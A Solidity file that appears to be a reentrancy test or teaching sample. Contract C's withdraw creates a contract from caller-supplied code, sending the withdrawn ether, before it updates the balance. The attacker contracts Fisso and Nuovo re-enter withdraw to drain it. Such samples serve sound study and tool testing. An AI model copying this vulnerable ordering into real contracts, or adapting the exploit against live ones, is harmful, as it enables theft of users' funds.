pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) public balances;


    function withdraw(uint256 amt, bytes memory initCode) public {
        require(balances[msg.sender] >= amt, "Insufficient funds");      

        // (bool success, ) = msg.sender.call{value: amt}("");
		address addr;
        assembly {
            addr := create(amt, add(initCode, 0x20), mload(initCode))
            if iszero(addr) {
                revert(0, 0)
            }
        }        

        balances[msg.sender] -= amt;    // side effect AFTER call makes this vulnerable to reentrancy
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;       
    }
}

contract Nuovo {
    constructor(address payable fisso) payable {
        fisso.transfer(msg.value);
    }
}

contract Fisso {
    bytes private nuovo_initcode;
    address private victim;

    constructor(bytes memory _nuovo_initcode, address _victim) {
        nuovo_initcode = _nuovo_initcode;
        victim = _victim;
    }

    function attack() public {
        C(victim).deposit{value: 1000}();
        C(victim).withdraw(1000, nuovo_initcode);
    }

    receive() external payable {
        C(victim).withdraw(msg.value, nuovo_initcode);
    }

}
